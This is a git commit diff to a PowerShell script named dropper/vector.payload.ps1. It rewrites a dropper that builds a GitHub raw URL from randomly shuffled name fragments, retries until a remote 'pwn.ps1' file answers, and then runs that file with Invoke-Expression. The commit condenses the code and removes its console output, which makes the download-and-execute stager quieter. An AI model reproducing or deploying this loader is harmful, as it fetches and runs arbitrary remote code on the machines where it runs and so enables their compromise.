a80ad5dcb39ac4a927946467da8ec2de3e3d237c
Toufik Airane <toufik.airane@gmail.com>
2015-10-31 15:45:02 +0100

    Update vector.payload.ps1

--- dropper/vector.payload.ps1
+++ dropper/vector.payload.ps1
@@ -1,26 +1,12 @@
 Function getUrl($url){
-  $web=[System.Net.WebRequest]::Create($url);
-  try {
-    $res=$web.GetResponse();
-  }catch{}
-  $stat=$res.StatusCode;
-  If($stat-eq200){
-    return (New-Object System.IO.StreamReader ($res.GetResponseStream())).ReadToEnd();
-  }Else{
-    return $false;
-  }
-}
-
+$web=[System.Net.WebRequest]::Create($url);
+try{$res=$web.GetResponse();}catch{}
+$stat=$res.StatusCode;
+If($stat-eq200){return (New-Object System.IO.StreamReader($res.GetResponseStream())).ReadToEnd();}
+return $false;}
 function setUrl{
-  ($url,$sub)=("", ("tf","air","ane"));
-  for($i=0;$i-lt$sub.Length;$i++){
-    $url+=$sub[(Get-Random -maximum $sub.Length)];
-  }
-  return "https://raw.githubusercontent.com/"+$url+"/Vectors/master/ps1/pwn.ps1";
-}
-
-Do{
-  $url=(setUrl);
-  write-host $url;
-}until(($c=getUrl($url)))
-Invoke-Expression ($c);
+($url,$sub)=("",("tf","air","ane"));
+for($i=0;$i-lt$sub.Length;$i++){$url+=$sub[(Get-Random -maximum $sub.Length)];}
+return "https://raw.githubusercontent.com/"+$url+"/Vectors/master/ps1/pwn.ps1";}
+Do{}until(($c=getUrl((setUrl))))
+Invoke-Expression($c);
